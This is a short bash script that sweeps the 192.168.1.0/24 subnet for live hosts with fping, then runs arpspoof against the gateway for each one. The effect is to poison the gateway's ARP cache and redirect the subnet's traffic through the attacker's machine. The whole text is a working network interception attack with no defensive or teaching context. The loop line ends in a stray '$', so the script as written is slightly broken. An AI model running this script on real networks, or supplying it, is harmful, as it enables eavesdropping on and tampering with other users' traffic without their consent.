#!/bin/bash

result=$(sudo fping -a -g 192.168.1.0/24 2>/dev/null)
echo "$result"

for ip in $result; do
    sudo arpspoof -i eth0 -t 192.168.1.1 "$ip" $
done
